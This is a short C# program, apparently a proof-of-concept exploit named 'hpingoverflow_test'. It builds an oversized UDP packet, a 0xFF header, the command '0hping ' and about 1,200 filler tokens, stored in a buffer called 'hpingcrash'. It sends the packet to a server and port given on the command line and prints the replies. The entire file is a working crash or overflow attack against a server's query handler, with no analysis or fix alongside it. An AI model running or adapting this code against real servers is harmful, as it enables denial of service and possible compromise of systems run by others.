using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace hpingoverflow_test
{
    class Program
    {
        static void Main(string[] args)
        {
            var writer = new BinaryWriter(new MemoryStream());
            var reader = new BinaryReader(writer.BaseStream);
            writer.Write(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF });
            writer.Write("0hping ".ToCharArray());
            for (int i = 0; i < 1200; i++ )
                writer.Write(("x" + i).ToCharArray());
            reader.BaseStream.Position = 0;
            byte[] hpingcrash = reader.ReadBytes((int)reader.BaseStream.Length);
            string server = args[0];
            int port = int.Parse(args[1]);
            var client = new UdpClient(server, port);
            client.Send(hpingcrash, hpingcrash.Length);
            while (true)
            {
                var EP = new IPEndPoint(IPAddress.Any, 0);
                var recieved = client.Receive(ref EP);
                Console.WriteLine(Encoding.ASCII.GetString(recieved));
            }
            Console.Read();
        }
    }
}
